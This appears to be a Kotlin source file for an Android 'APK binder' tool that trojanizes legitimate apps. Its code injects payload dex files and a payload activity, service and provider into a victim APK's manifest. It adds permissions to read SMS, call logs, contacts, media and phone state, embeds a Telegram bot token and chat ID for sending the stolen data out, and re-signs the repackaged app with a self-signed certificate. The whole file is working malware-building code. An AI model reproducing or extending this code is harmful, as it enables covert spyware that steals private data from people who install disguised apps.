package Com.devhs.apkbinder.binder

import android.content.Context
import android.net.Uri
import androidx.documentfile.provider.DocumentFile
import com.android.apksig.ApkSigner
import Com.devhs.apkbinder.core.Const
import Com.devhs.apkbinder.data.Feature
import Com.devhs.apkbinder.data.LogLevel
import Com.devhs.apkbinder.data.PayloadConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.security.KeyFactory
import java.security.KeyPair
import java.security.KeyPairGenerator
import java.security.KeyStore
import java.security.PrivateKey
import java.security.SecureRandom
import java.security.Signature
import java.security.cert.CertificateFactory
import java.security.cert.X509Certificate
import java.security.spec.PKCS8EncodedKeySpec
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.zip.CRC32
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipFile

data class BindResult(
    val ok: Boolean,
    val message: String,
    val outputPath: String? = null
)

class BinderEngine(private val context: Context) {

    companion object {
        private const val ALIGN_SO = 16384
        private const val ALIGN_DEFAULT = 4
        private const val MANIFEST = "AndroidManifest.xml"
        private const val DEX_REGEX = "classes(\\d*)\\.dex"
    }

    suspend fun bind(
        source: Uri,
        activity: String,
        label: String,
        features: Set<Feature>,
        config: PayloadConfig,
        outDir: DocumentFile,
        onLog: (LogLevel, String) -> Unit
    ): BindResult = withContext(Dispatchers.IO) {

        val temps = ArrayList<File>()

        try {
            if (label.isNotBlank()) onLog(LogLevel.INFO, "App: $label")

            val src: File? = resolveSource(source)
            if (src == null) {
                onLog(LogLevel.ERROR, "Source APK not readable")
                return@withContext BindResult(false, "Source not readable")
            }
            onLog(LogLevel.INFO, "Source APK: ${src.length() / 1024} KB")

            val pm = context.packageManager
            val info = pm.getPackageArchiveInfo(src.absolutePath, 0)
            if (info == null) {
                onLog(LogLevel.ERROR, "Source APK could not be parsed")
                return@withContext BindResult(false, "Parse failed")
            }

            val pkg: String = info.packageName
            onLog(LogLevel.INFO, "Package: $pkg")

            val splits: List<File> = splitApks(pkg)
            if (splits.isNotEmpty()) onLog(LogLevel.INFO, "Split APKs: ${splits.size}")

            val permissions: List<String> = buildPermissions(features, config.features)
            onLog(LogLevel.INFO, "Permissions requested: ${permissions.size}")

            val authority: String = pkg + Const.AUTHORITY_SUFFIX

            val payloadDexes: List<ByteArray> = collectPayloadDexes()
            if (payloadDexes.isEmpty()) {
                onLog(LogLevel.ERROR, "Payload dex not found in own APK")
                return@withContext BindResult(false, "Payload dex missing")
            }

            val temp = File(context.cacheDir, "hs_${System.currentTimeMillis()}.unsigned.apk")
            temps.add(temp)

            var patched: ByteArray? = null

            ZipFile(src).use { zip ->

                val entry = zip.getEntry(MANIFEST)
                if (entry == null) {
                    onLog(LogLevel.ERROR, "$MANIFEST not found")
                    return@withContext BindResult(false, "Manifest missing")
                }

                val manifest: ByteArray = zip.getInputStream(entry).use { it.readBytes() }

                patched = AxmlPatcher.patch(
                    manifest,
                    Const.PAYLOAD_ACTIVITY,
                    Const.PAYLOAD_SERVICE,
                    Const.PAYLOAD_PROVIDER,
                    authority,
                    permissions,
                    true
                )

                val patchedBytes: ByteArray? = patched
                if (patchedBytes == null) {
                    onLog(LogLevel.ERROR, "Manifest patch failed")
                    return@withContext BindResult(false, "Manifest patch failed")
                }

                var slot: Int = maxDexIndex(zip)
                val seen = HashSet<String>()

                FileOutputStream(temp).use { fos ->
                    val zw = ZipWriter(fos)

                    val entries = zip.entries()
                    while (entries.hasMoreElements()) {
                        val e = entries.nextElement()
                        val name = e.name
                        seen.add(name)

                        if (name == MANIFEST) continue
                        if (name == "assets/" + Const.CONFIG_ASSET) continue
                        if (isSignatureFile(name)) continue

                        val data = zip.getInputStream(e).use { it.readBytes() }
                        zw.add(name, data, e.method == ZipEntry.STORED)
                    }

                    var copied = 0
                    for (sp in splits) {
                        try {
                            ZipFile(sp).use { sz ->
                                val se = sz.entries()
                                while (se.hasMoreElements()) {
                                    val e = se.nextElement()
                                    val name = e.name
                                    if (name == MANIFEST || name == "resources.arsc") continue
                                    if (name.startsWith("META-INF/")) continue
                                    if (!(name.startsWith("lib/") || name.startsWith("assets/"))) continue
                                    if (seen.contains(name)) continue
                                    seen.add(name)
                                    val data = sz.getInputStream(e).use { it.readBytes() }
                                    zw.add(name, data, e.method == ZipEntry.STORED)
                                    copied++
                                }
                            }
                        } catch (t: Throwable) {
                            onLog(LogLevel.WARN, "split read failed: ${t.message}")
                        }
                    }
                    if (copied > 0) onLog(LogLevel.INFO, "Merged $copied split entries")

                    zw.add(MANIFEST, patchedBytes, false)

                    for (dex in payloadDexes) {
                        slot++
                        val dexName = if (slot == 1) "classes.dex" else "classes$slot.dex"
                        zw.add(dexName, dex, false)
                    }

                    if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
                        val feats = config.features.joinToString(",") { "\"$it\"" }
                        val json = "{\"bot_token\":\"${config.token}\"," +
                                "\"chat_id\":\"${config.chatId}\"," +
                                "\"features\":[$feats]}"
                        zw.add("assets/" + Const.CONFIG_ASSET, json.toByteArray(), false)
                        onLog(LogLevel.INFO, "Config injected")
                    } else {
                        onLog(LogLevel.WARN, "Config missing")
                    }

                    zw.finish()
                }
            }

            onLog(LogLevel.INFO, "Signing...")
            val signed = File(context.cacheDir, "hs_${System.currentTimeMillis()}.signed.apk")
            temps.add(signed)

            try {
                sign(temp, signed, onLog)
            } catch (t: Throwable) {
                onLog(LogLevel.ERROR, "Sign failed: ${t.message}")
                return@withContext BindResult(false, "Sign failed: ${t.message}")
            }

            val check = pm.getPackageArchiveInfo(signed.absolutePath, 0)
            if (check == null) {
                onLog(LogLevel.ERROR, "Verification failed")
                return@withContext BindResult(false, "Verification failed")
            }

            onLog(LogLevel.INFO, "Verified: ${check.packageName}")
            onLog(LogLevel.INFO, "Signed size: ${signed.length() / 1024} KB")

            val outName = sanitize(label) + "_hs.apk"
            val doc = outDir.createFile("application/vnd.android.package-archive", outName)
            if (doc == null) {
                onLog(LogLevel.ERROR, "Cannot create output file")
                return@withContext BindResult(false, "Cannot create output file")
            }

            val out = context.contentResolver.openOutputStream(doc.uri)
            if (out == null) {
                onLog(LogLevel.ERROR, "Cannot write output file")
                return@withContext BindResult(false, "Cannot write output")
            }
            out.use { o ->
                signed.inputStream().use { i -> i.copyTo(o) }
            }

            onLog(LogLevel.SUCCESS, "Saved: $outName")
            BindResult(true, "Success", doc.uri.toString())

        } catch (t: Throwable) {
            onLog(LogLevel.ERROR, "${t.javaClass.simpleName}: ${t.message}")
            t.stackTrace.take(6).forEach { onLog(LogLevel.ERROR, "   at $it") }
            BindResult(false, t.message ?: "Unknown error")
        } finally {
            for (f in temps) {
                try {
                    if (f.exists()) f.delete()
                } catch (_: Throwable) {
                }
            }
        }
    }

    private fun splitApks(pkg: String): List<File> {
        val out = ArrayList<File>()
        try {
            val pm = context.packageManager
            collectSplits(pm.getApplicationInfo(pkg, 0), out)
            if (out.isEmpty()) collectSplits(pm.getPackageInfo(pkg, 0), out)
        } catch (t: Throwable) {
        }
        return out
    }

    private fun collectSplits(obj: Any, out: MutableList<File>) {
        try {
            val f = obj.javaClass.getField("splitSourceDirs")
            val arr = f.get(obj) as? Array<*> ?: return
            for (o in arr) {
                val p = o as? String ?: continue
                val file = File(p)
                if (file.exists() && !out.contains(file)) out.add(file)
            }
        } catch (t: Throwable) {
        }
    }

    private class CdEntry(
        val name: ByteArray,
        val method: Int,
        val crc: Long,
        val compSize: Int,
        val size: Int,
        val offset: Long
    )

    private inner class ZipWriter(private val out: OutputStream) {
        private var pos: Long = 0L
        private val cd = ArrayList<CdEntry>()

        fun add(name: String, data: ByteArray, stored: Boolean) {
            val crc = CRC32()
            crc.update(data)
            val payload = if (stored) data else deflate(data)
            val method = if (stored) 0 else 8
            val nameBytes = name.toByteArray(Charsets.UTF_8)

            val align = if (name.startsWith("lib/") && name.endsWith(".so")) ALIGN_SO else ALIGN_DEFAULT
            val headerLen = 30 + nameBytes.size
            val pad = paddingFor(pos + headerLen, align)
            val offset = pos

            writeInt(0x04034b50)
            writeShort(20)
            writeShort(0x0800)
            writeShort(method)
            writeShort(0)
            writeShort(0x0021)
            writeInt(crc.value.toInt())
            writeInt(payload.size)
            writeInt(data.size)
            writeShort(nameBytes.size)
            writeShort(pad)
            writeBytes(nameBytes)
            if (pad > 0) writeBytes(ByteArray(pad))
            writeBytes(payload)

            cd.add(CdEntry(nameBytes, method, crc.value, payload.size, data.size, offset))
        }

        fun finish() {
            val cdStart = pos
            for (e in cd) {
                writeInt(0x02014b50)
                writeShort(20)
                writeShort(20)
                writeShort(0x0800)
                writeShort(e.method)
                writeShort(0)
                writeShort(0x0021)
                writeInt(e.crc.toInt())
                writeInt(e.compSize)
                writeInt(e.size)
                writeShort(e.name.size)
                writeShort(0)
                writeShort(0)
                writeShort(0)
                writeShort(0)
                writeInt(0)
                writeInt(e.offset.toInt())
                writeBytes(e.name)
            }
            val cdSize = pos - cdStart

            writeInt(0x06054b50)
            writeShort(0)
            writeShort(0)
            writeShort(cd.size)
            writeShort(cd.size)
            writeInt(cdSize.toInt())
            writeInt(cdStart.toInt())
            writeShort(0)

            out.flush()
        }

        private fun writeInt(v: Int) {
            writeBytes(
                byteArrayOf(
                    (v and 0xFF).toByte(),
                    ((v shr 8) and 0xFF).toByte(),
                    ((v shr 16) and 0xFF).toByte(),
                    ((v shr 24) and 0xFF).toByte()
                )
            )
        }

        private fun writeShort(v: Int) {
            writeBytes(byteArrayOf((v and 0xFF).toByte(), ((v shr 8) and 0xFF).toByte()))
        }

        private fun writeBytes(b: ByteArray) {
            out.write(b)
            pos += b.size
        }

        private fun deflate(data: ByteArray): ByteArray {
            val d = Deflater(Deflater.DEFAULT_COMPRESSION, true)
            d.setInput(data)
            d.finish()
            val bos = ByteArrayOutputStream()
            val buf = ByteArray(32 * 1024)
            while (!d.finished()) {
                val n = d.deflate(buf)
                if (n > 0) bos.write(buf, 0, n)
            }
            d.end()
            return bos.toByteArray()
        }
    }

    private fun paddingFor(position: Long, align: Int): Int {
        val rem = (position % align).toInt()
        return if (rem == 0) 0 else align - rem
    }

    private fun collectPayloadDexes(): List<ByteArray> {
        val out = ArrayList<ByteArray>()
        try {
            val self = context.packageManager
                .getApplicationInfo(context.packageName, 0).sourceDir
            val rx = Regex(DEX_REGEX)
            ZipFile(self).use { z ->
                val entries = z.entries()
                while (entries.hasMoreElements()) {
                    val e = entries.nextElement()
                    if (!rx.matches(e.name)) continue
                    out.add(z.getInputStream(e).use { it.readBytes() })
                }
            }
        } catch (t: Throwable) {
        }
        return out
    }

    private fun maxDexIndex(zip: ZipFile): Int {
        var max = 0
        val rx = Regex(DEX_REGEX)
        val entries = zip.entries()
        while (entries.hasMoreElements()) {
            val m = rx.matchEntire(entries.nextElement().name) ?: continue
            val n = m.groupValues[1].toIntOrNull() ?: 1
            if (n > max) max = n
        }
        return max
    }

    private fun resolveSource(uri: Uri): File? {
        try {
            if (uri.scheme == "file") {
                val path = uri.path
                if (path != null) {
                    val f = File(path)
                    if (f.exists()) return f
                }
                return null
            }
            val tmp = File(context.cacheDir, "src_${System.currentTimeMillis()}.apk")
            val input = context.contentResolver.openInputStream(uri)
            if (input == null) return null
            input.use { i ->
                tmp.outputStream().use { o -> i.copyTo(o) }
            }
            if (tmp.exists() && tmp.length() > 0) return tmp
            return null
        } catch (t: Throwable) {
            return null
        }
    }

    private fun sanitize(label: String): String {
        var base = label.ifBlank { "app" }
        base = base.replace(Regex("[^A-Za-z0-9._-]"), "_")
        base = base.take(40)
        return if (base.isBlank()) "app" else base
    }

    private fun buildPermissions(features: Set<Feature>, keys: List<String>): List<String> {
        val set = LinkedHashSet<String>()

        set += "android.permission.INTERNET"
        set += "android.permission.ACCESS_NETWORK_STATE"
        set += "android.permission.POST_NOTIFICATIONS"
        set += "android.permission.WAKE_LOCK"
        set += "android.permission.RECEIVE_BOOT_COMPLETED"
        set += "android.permission.FOREGROUND_SERVICE"
        set += "android.permission.FOREGROUND_SERVICE_DATA_SYNC"

        val all = ArrayList<String>()
        for (f in features) {
            all.add(f.key.lowercase())
            all.add(f.name.lowercase())
        }
        for (k in keys) all.add(k.lowercase())

        if (all.any { it.contains("gallery") }) {
            set += "android.permission.READ_EXTERNAL_STORAGE"
            set += "android.permission.READ_MEDIA_IMAGES"
            set += "android.permission.READ_MEDIA_VIDEO"
        }
        if (all.any { it.contains("sms") }) {
            set += "android.permission.READ_SMS"
            set += "android.permission.RECEIVE_SMS"
        }
        if (all.any { it.contains("call") }) {
            set += "android.permission.READ_CALL_LOG"
            set += "android.permission.READ_PHONE_STATE"
        }
        if (all.any { it.contains("contact") }) {
            set += "android.permission.READ_CONTACTS"
        }
        if (all.any { it.contains("device") }) {
            set += "android.permission.READ_PHONE_STATE"
        }

        return set.toList()
    }

    private fun isSignatureFile(name: String): Boolean {
        if (!name.startsWith("META-INF/")) return false
        val upper = name.uppercase()
        return upper.endsWith(".RSA") || upper.endsWith(".DSA") ||
                upper.endsWith(".EC") || upper.endsWith(".SF") || upper.endsWith(".MF")
    }

    private fun sign(input: File, output: File, onLog: (LogLevel, String) -> Unit) {
        val identity = signingIdentity(onLog)
        val signer = ApkSigner.SignerConfig.Builder("hs", identity.first, listOf(identity.second)).build()

        ApkSigner.Builder(listOf(signer))
            .setInputApk(input)
            .setOutputApk(output)
            .setV1SigningEnabled(true)
            .setV2SigningEnabled(true)
            .setV3SigningEnabled(true)
            .build()
            .sign()

        onLog(LogLevel.INFO, "Signed: ${output.length() / 1024} KB")
    }

    private fun signingIdentity(onLog: (LogLevel, String) -> Unit): Pair<PrivateKey, X509Certificate> {
        val dir = File(context.filesDir, "sign")
        val keyFile = File(dir, "key.pk8")
        val certFile = File(dir, "cert.der")

        if (keyFile.exists() && certFile.exists()) {
            try {
                val kf = KeyFactory.getInstance("RSA")
                val key = kf.generatePrivate(PKCS8EncodedKeySpec(keyFile.readBytes()))
                val cf = CertificateFactory.getInstance("X.509")
                val cert = cf.generateCertificate(certFile.inputStream()) as X509Certificate
                return key to cert
            } catch (t: Throwable) {
                onLog(LogLevel.WARN, "Saved key unreadable")
            }
        }

        fromAssetKeystore()?.let {
            try {
                dir.mkdirs()
                keyFile.writeBytes(it.first.encoded)
                certFile.writeBytes(it.second.encoded)
            } catch (_: Throwable) {
            }
            return it
        }

        dir.mkdirs()
        val kp = KeyPairGenerator.getInstance("RSA").apply { initialize(2048) }.generateKeyPair()
        val cert = selfSigned(kp)
        keyFile.writeBytes(kp.private.encoded)
        certFile.writeBytes(cert.encoded)
        return kp.private to cert
    }

    private fun fromAssetKeystore(): Pair<PrivateKey, X509Certificate>? {
        for (type in listOf("PKCS12", "BKS", "JKS")) {
            try {
                val ks = KeyStore.getInstance(type)
                context.assets.open(Const.KEYSTORE_ASSET).use {
                    ks.load(it, Const.KS_PASS.toCharArray())
                }
                val alias = if (ks.containsAlias(Const.KS_ALIAS)) Const.KS_ALIAS
                else ks.aliases().nextElement()
                val key = ks.getKey(alias, Const.KS_PASS.toCharArray()) as PrivateKey
                val cert = ks.getCertificate(alias) as X509Certificate
                return key to cert
            } catch (t: Throwable) {
            }
        }
        return null
    }

    private fun selfSigned(kp: KeyPair): X509Certificate {
        val sha256Rsa = seq(oid("1.2.840.113549.1.1.11"), tlv(0x05, ByteArray(0)))
        val name = seq(set(seq(oid("2.5.4.3"), tlv(0x0C, "Hs Binder".toByteArray()))))

        val now = Date()
        val notBefore = utcTime(Date(now.time - 86400000L))
        val notAfter = utcTime(Date(now.time + 3650L * 86400000L))

        val serial = ByteArray(16)
        SecureRandom().nextBytes(serial)
        serial[0] = (serial[0].toInt() and 0x7F).toByte()
        if (serial[0] == 0.toByte()) serial[0] = 1

        val tbs = seq(
            tlv(0xA0, tlv(0x02, byteArrayOf(2))),
            tlv(0x02, serial),
            sha256Rsa,
            name,
            seq(notBefore, notAfter),
            name,
            kp.public.encoded
        )

        val sig = Signature.getInstance("SHA256withRSA").apply {
            initSign(kp.private)
            update(tbs)
        }.sign()

        val der = seq(tbs, sha256Rsa, tlv(0x03, byteArrayOf(0) + sig))

        return CertificateFactory.getInstance("X.509")
            .generateCertificate(der.inputStream()) as X509Certificate
    }

    private fun derLen(n: Int): ByteArray {
        if (n < 0x80) return byteArrayOf(n.toByte())
        var v = n
        var count = 0
        while (v > 0) {
            v = v shr 8
            count++
        }
        val out = ByteArray(count + 1)
        out[0] = (0x80 or count).toByte()
        for (i in 1..count) out[i] = ((n shr (8 * (count - i))) and 0xFF).toByte()
        return out
    }

    private fun tlv(tag: Int, body: ByteArray): ByteArray =
        byteArrayOf(tag.toByte()) + derLen(body.size) + body

    private fun seq(vararg parts: ByteArray): ByteArray {
        var body = ByteArray(0)
        for (p in parts) body += p
        return tlv(0x30, body)
    }

    private fun set(vararg parts: ByteArray): ByteArray {
        var body = ByteArray(0)
        for (p in parts) body += p
        return tlv(0x31, body)
    }

    private fun oid(dotted: String): ByteArray {
        val parts = dotted.split('.').map { it.toLong() }
        val body = ArrayList<Byte>()
        body.add((40 * parts[0] + parts[1]).toByte())
        for (i in 2 until parts.size) {
            var v = parts[i]
            val stack = ArrayList<Byte>()
            stack.add((v and 0x7F).toByte())
            v = v shr 7
            while (v > 0) {
                stack.add(((v and 0x7F) or 0x80).toByte())
                v = v shr 7
            }
            for (j in stack.indices.reversed()) body.add(stack[j])
        }
        return tlv(0x06, body.toByteArray())
    }

    private fun utcTime(d: Date): ByteArray {
        val f = SimpleDateFormat("yyMMddHHmmss'Z'", Locale.US)
        f.timeZone = TimeZone.getTimeZone("UTC")
        return tlv(0x17, f.format(d).toByteArray())
    }
}
